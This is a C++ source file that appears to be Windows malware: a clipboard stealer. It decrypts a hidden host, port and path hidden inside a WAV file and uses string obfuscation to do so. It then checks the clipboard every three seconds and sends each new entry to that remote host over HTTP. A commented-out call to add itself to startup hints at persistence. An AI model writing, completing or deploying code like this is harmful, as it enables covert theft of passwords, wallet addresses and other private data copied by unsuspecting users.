#include <iostream>
#include <windows.h>
#include <string>
#include <thread>

#include <clipboard.h>
#include <tools.h>
#include <httpexfil.h>
#include <wavcrypt.h>
#include <obfstr.h>

void HandleNewData(std::string& data, std::string& host, std::string& path, int port)
{    
    try
    {
        ExfiltrateClipboardHTTP(data, host, path, port);
    }
    catch(const std::exception& ex)
    {
        std::cout << ex.what() << "\n";
    }
    catch(...)
    {}
}

int main() {
    // AddToStartup();

    std::string lastClipboard = "";

    auto [host, port_string, path] = ExtractAndDecryptConfig(OBFSTR("ouch.wav"));
    int port = std::stoi(port_string);

    while(true)
    {
        std::string currentClipboard = GetClipboardText();

        if(!currentClipboard.empty() && currentClipboard != lastClipboard) 
        {
            HandleNewData(currentClipboard, host, path, port);  
            lastClipboard = currentClipboard;
        }

        std::this_thread::sleep_for(std::chrono::seconds(3));
    }

    return 0;
}
